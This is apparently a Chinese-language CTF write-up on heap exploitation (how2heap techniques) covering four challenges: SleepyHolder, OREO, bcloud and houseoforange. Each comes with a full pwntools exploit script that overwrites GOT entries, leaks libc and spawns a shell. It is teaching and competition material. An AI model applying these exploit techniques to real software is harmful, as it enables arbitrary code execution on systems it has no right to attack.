---
title: how2heap writeup
description: 
categories:
tags: 
grammar_cjkRuby: true
---


### Hitcon 2016 SleepyHolder
1. 题目的漏洞是可以 double free

![doublefree](https://www.github.com/Byzero512/blog_img/raw/master/1538372886367.png)

2. 但是这道题目最特别的地方在于: 最多只有三个chunk,每一个chunk大小不一样,而且有一个是 mmap chunk
> 我们并不能直接使用 double free, 而是先 fast_dup_consolidate, 实现double free: 结果是 同一个chunk会同时出现在 fastbin 和 smallbin, 为 uaf漏洞
> 光靠uaf无法达到利用, 要再加上unlink利用.

#### 利用流程

1. malloc fastbin
2. malloc largebin(防止free fastbin的时候fastbin与topchunk合并)
3. free fastbin
4. malloc mmap_largechunk(调用malloc consolidate, 结果是之前free的fastchunk出现在smallbin)
5. free fastbin(达成double free)
6. malloc fastbin(注意这里的payload要能够绕过unlink)
7. free largebin(第二步malloc出来的), 这时会unlink前面那一个
8. 利用unlink之后我们就可以控制全局指针段
9. 改 free_got-->puts_plt
10. leak puts_got, 然后 leak 出system
11. 改 free_got --> system
12. 设置好 '/bin/sh\x00' 的位置

> 难点在于绕过unlink:
我们在fastchunk中伪造一个小fastchunk,并设置好它的指针指向bss段中合适的位置,即可绕过并且利用unlink

#### exp
```python
p=process('./SleepyHolder')
context.log_level='debug'
context.arch='amd64'
gdb.attach(p)

e=ELF('./SleepyHolder')
free_got=e.got['free']
puts_plt=e.plt['puts']      ## ba free_got change to puts 
puts_got=e.got['puts']

def newsmall(payload):
	p.recvuntil('3. Renew secret\n')
	p.sendline('1')
	p.recv()
	p.sendline('1')
	p.recvuntil('Tell me your secret: \n')
	p.sendline(payload)

def newbig(payload):
	p.recvuntil('3. Renew secret\n')
	p.sendline('1')
	p.recv()
	p.sendline('2')
	p.recvuntil('Tell me your secret: \n')
	p.sendline(payload)
def newhuge(payload):
	p.recvuntil('3. Renew secret\n')
	p.sendline('1')
	p.recvuntil('3. Keep a huge secret and lock it forever\n')
	p.sendline('3')
	p.recvuntil('Tell me your secret: \n')
	p.sendline(payload)

def deletesmall():
	p.recvuntil('3. Renew secret\n')
	p.sendline('2')
	p.recv()
	p.sendline('1')

def deletebig():
	p.recvuntil('3. Renew secret\n')
	p.sendline('2')
	p.recv()
	p.sendline('2')
	

def renew(choice,payload):
	p.recvuntil('3. Renew secret\n')
	p.sendline('3')
	p.recv()
	p.sendline(str(choice))
	p.recvuntil('Tell me your secret: \n')
	p.send(payload)


newsmall('\x00\x00\x00')
newbig('\x00\x00\x00')
deletesmall()
newhuge('\x00\x00\x00')

deletesmall()        # double free: fastbin and small bin

payload=('\x00'*0x8+p64(0x21)+p64(0x6020D0-0x18)+p64(0x6020D0-0x10))+p64(0x20)
newsmall(payload)
deletebig()                # then the fast_chunk_ptr point to the position nearby it 

newbig('big_secret')           

payload=p64(0)+p64(free_got)        # change glo_ptr --> free_got
renew(1,payload)
renew(2,p64(puts_plt))              # change free_got --> puts_plt

payload=p64(0)+p64(puts_got)
renew(1,payload)
deletebig()                  

puts_libc=u64(p.recvuntil('1')[0:6].ljust(8,'\x00'))
puts_off=456336
sys_off=283536
system=puts_libc-puts_off+sys_off

newbig('123456')
payload=p64(0)+p64(free_got)
renew(1,payload)
renew(2,p64(system))             


payload=('/bin/sh\x00').ljust(8,'\x00')+p64(0x6020b8)
renew(1,payload)

deletebig()

p.interactive()

```


### house-of-spirit
> 这道题最烦的地方在于输入是使用 fgets() 读入的, 如果是用read读输入的话会容易很多很多
> fgets(ptr,n,fd) 特别的地方在于: 读取字符串时, 如果读入字符不超过n, 那么会在最后再加上一个'\x00',如果需要读入的字符超过n, 那么只会读 n-1 个,第 n 个会变为'\x00'
> 另外一个烦人的地方在于改谁的got为system(这是由于fgets这个操蛋的函数引起的一个问题,本来该4bytes就好了,但是fgets这个函数偏偏改多几个bytes,改变了相邻got项,导致函数定位错误)


#### hack.lu CTF 2014-OREO
##### 题目分析
1. 分配出来的chunk是同样大小的: 0x40; 并且串在一个单向不循环链表中
2. 在该链表上的指针可以被改变,但是有个操蛋的fgets函数,应该用name字段去改这个指针

##### 利用流程
1. leak出libc
2. malloc ---> bss
3. change scanf->got --> system 

##### exp
```python
#!/usr/bin/env python
from pwn import *

p=process('./oreo')
gdb.attach(p)
context.log_level='debug'

def add(name_payload,description_payload,i=0):
	p.sendline('1')
	p.sendline(name_payload)
	if i==0:
		p.sendline(description_payload)
	elif i==1:
		p.send(description_payload)

def show():
	p.sendline('2')
	
def clear():
	p.sendline('3')
	
def add_notice(notice_payload):
	p.sendline('4')
	p.sendline(notice_payload)

def print_record():
	p.sendline('5')


e=ELF('./oreo')
free_got=e.got['free']
puts_got=e.got['puts']

name='\x00'*(52-25)+p32(puts_got)
des='\x00'
add(name,des)
show()

p.recvuntil('Description: ')
p.recvuntil('Description: ')
puts_libc=u32(p.recvline()[0:4])
puts_off=392352
system_off=241056
system=puts_libc-puts_off+system_off

for i in range(63):
	add('123','123')

name='\x00'*27+p32(0x0804a2a8)       
description='\x00'
add(name,description)               

payload='\x00'*32+p32(0)+p32(0x41)
add_notice(payload) 

clear()                              

scanf=e.got['__isoc99_sscanf']
add('\x00',p32(scanf)) 
payload=p32(system)    
add_notice(payload)             # change got 
                
p.sendline('/bin/sh\x00')


p.interactive()

```


### house of force

#### 2016 bctf --- bcloud
> 这个题目其实算是 off-by-one 加上 house of force.

##### 题目分析
> 首先输入名字,接着输入host和organiser的内容
> 在输入名字的时候由于off-by-one的问题,没有截断字符串,导致可以leak出一个指向堆chunk的指针,为 house of force 提供前提条件
> 在输入host和organiser的内容时候,由于输入的字符串截断不正确,导致可以控制 topchunk 的大小,为 house of force 提供前提条件
> 由于程序没开pie,所以可以知道bss段上全局堆指针的地址, 为 house of force 提供前提条件
> house of force 的三个前提条件都符合, 可以使用 house of force

##### 利用流程
1. house of force 分配一个chunk到bss上, 控制对应的全局指针
2. 由于这个pwn题没有自带的show content的函数的选项,所以我们需要将 free 的 got 改成 puts,然后leak出libc得到system
3. leak出libc之后,改 free 或者 atoi 的 got 为 system 即可.


##### exp

```python
#!/usr/bin/env python
from pwn import *

p=process('./bcloud')
context.log_level='debug'

e=ELF('./bcloud')
free_got=e.got['free']
puts_plt=e.plt['puts']
puts_got=e.got['puts']

debug=1
if debug:
	gdb.attach(p)

p.recvuntil('Input your name:\n')
name_payload='a'*0x40
p.send(name_payload)

p.recvuntil('a'*0x40)
name_usr_ptr=u32(p.recvuntil("Now let's set synchronization options.\n")[0:4])
print(hex(name_usr_ptr))


p.recvuntil('Org:\n')
org_payload='a'*0x40
p.send(org_payload)

p.recvuntil('Host:\n')
host_payload='\xff\xff\xff\xff'
p.sendline(host_payload)

top_ptr=name_usr_ptr+0x40+0x48+0x48
print(hex(top_ptr))

target_adr=0x0804B120
size_eval=(target_adr-4*4-top_ptr)-4

p.recvuntil('option--->>\n')                             # new 0
p.sendline('1')
p.recvuntil('Input the length of the note content:\n')
p.sendline(str(size_eval))
p.recvuntil('Input the content:\n')
p.sendline(p32(free_got))

p.recvuntil('option--->>\n')
p.sendline('1')
p.recvuntil('Input the length of the note content:\n')       # new 1
p.sendline(str(0x20))
p.recvuntil('Input the content:\n')
p.sendline(p32(free_got)+p32(0x0804B120))
	


def edit(index,payload,i=0):
	p.recvuntil('option--->>\n')
	p.sendline('3')
	p.recvuntil('Input the id:\n')
	p.sendline(str(index))
	p.recvuntil('Input the new content:\n')
	if i==1:
		p.send(payload)
	else:
		p.sendline(payload)

p.recvuntil('option--->>\n')
p.sendline('1')
p.recvuntil('Input the length of the note content:\n')       # new 2
p.sendline(str(0x20))
p.recvuntil('Input the content:\n')
p.sendline('123')

payload=p32(puts_got)+p32(0x0804B120)+p32(free_got)
edit(1,payload)

payload=p32(puts_plt)                      # change free_got --> puts_plt
edit(2,payload)

def delete(index):
	p.recvuntil('option--->>\n')
	p.sendline('4')
	p.recvuntil('Input the id:\n')
	p.sendline(str(index))	

delete(0)

puts_libc=u32(p.recvuntil('Delete success.\n')[0:4])
sleep(0.5)
puts_off=392352
system_off=241056
system_libc=puts_libc-puts_off+system_off         # leak libc

edit(2,p32(system_libc))                          # change free_got --> system

bin_sh_payload='\x00'*4+p32(0x0804b128)+'/bin/sh\x00'
edit(1,bin_sh_payload)
delete(1)
p.interactive()


```

### house of orange

#### houseoforange hitcon2016

##### 题目分析
1. 没有free
2. 能控制topchunk的大小
3. 能 malloc 4次, edit 3次

##### 攻击思路
1. 通过 house of orange 搞出一个 unsorted bin
2. leak libc: malloc出来的chunk,原来的fd-bk链没被清空, 可以用来leak libc
3. leak heap: 这个比较玄学
	+ 经过测试:
		+ 本题中: 只有分配出足够大的chunk时, chunk的next_chunk链将指向该chunk本身
		+ 而实际上,会出现这种原因, 是因为在遍历unsorted bin的时, chunk不是exact fit, 就会放到smallbin或者largebin, 如果是放到largebin中, 如果largebin是空的, 那么chunk的nextsize链指向该chunk本身, malloc的时候如果设置清除, 就会保留.
		+ 玄学的地方在于: 本题要malloc足够大才会保留, 而自己写个malloc程序测试时, 即使是malloc(0x20), 返回的chunk也会保留有 nextsize 链
		+ 真的玄学

4. leak heap之后就可以unsortedbin attack, 使 io_list_all 指向 unsortedbin
	+ 这一步会破坏unsortedbin,会报错, 那么就可以使用 Fsop

5. Fsop

#### exp
```python
#!/usr/bin/env python
from pwn import *

p=process(argv=["./houseoforange"],env={"LD_PRELOAD":"./libc.so.6"})
context.log_level="debug"

gdb.attach(p)

def new(lenofname,name,color_num=56746,price=0xffffffff):
    p.recvuntil("Your choice : ")
    p.sendline("1")
    p.recvuntil('Length of name :')
    p.sendline(str(lenofname))
    p.recvuntil("Name :")
    p.send(name)
    p.recvuntil("Price of Orange:")
    p.sendline(str(price))
    p.recvuntil("Color of Orange:")
    p.sendline(str(color_num))

def edit(name_len,name,price=0xffffffff,color=56746):
    p.recvuntil("Your choice : ")
    p.sendline("3")
    p.recvuntil("Length of name :")
    p.sendline(str(name_len))
    p.recvuntil("Name:")
    p.send(name)
    p.recvuntil("Price of Orange: ")
    p.sendline(str(price))
    p.recvuntil("Color of Orange: ")
    p.sendline(str(color))

def show():
    p.recvuntil("Your choice : ")
    p.sendline("2")

new(1,"\x78")                                # new 0
name_len=0x10+0x20+0x10     # name_chunk_usr + message_chunk + top_chunk_header
name_payload='name'*4
name_payload+=p64(0)+p64(0x21)+p32(0xffffffff)+p32(56746)+'a'*8
name_payload+='\x00'*8+p64(0xfa1)

edit(name_len,name_payload)                 # edit 0

new(0x1000,"\x78")                         # new 1
new(0x400,"\x78");                            # new 2

show()

p.recvuntil("Name of house : ")
unsorted_libc=u64(p.recvuntil("House")[0:6].ljust(8,"\x00"))
libc_base=unsorted_libc-0x3c4178

oneoff=0x45206
onegadget=oneoff+libc_base
io_list_all_off=0x3c4520
io_list_all=libc_base+io_list_all_off

name_len=0x10
name_payload=name_len*'a'

edit(name_len,name_payload)                           # edit 1
show()                                                # leak heap
p.recvuntil("a"*16)
heap=u64((p.recvuntil("House")[0:6]).ljust(8,"\x00"))

io_file_plus=heap+0x410+0x20
vtable=p64(0)*3+p64(onegadget)

pad_payload='\x00'*0x400+'\x00'*0x20

fsop_payload='/bin/sh\x00'+p64(0x61)             # 0x10
fsop_payload+=p64(0)+p64(io_list_all-0x10)        #0x20       
fsop_payload+=p64(2)+p64(3)                      # io_write_base io_write_ptr
fsop_payload+=vtable
fsop_payload=fsop_payload.ljust(0xd8,'\x00')
fsop_payload+=p64(io_file_plus+0x30)
payload=pad_payload+fsop_payload
edit(len(payload),payload)

log.success("io_list_all: "+hex(io_list_all))
log.success("heap: "+hex(heap))
p.sendline('1')

p.interactive()


```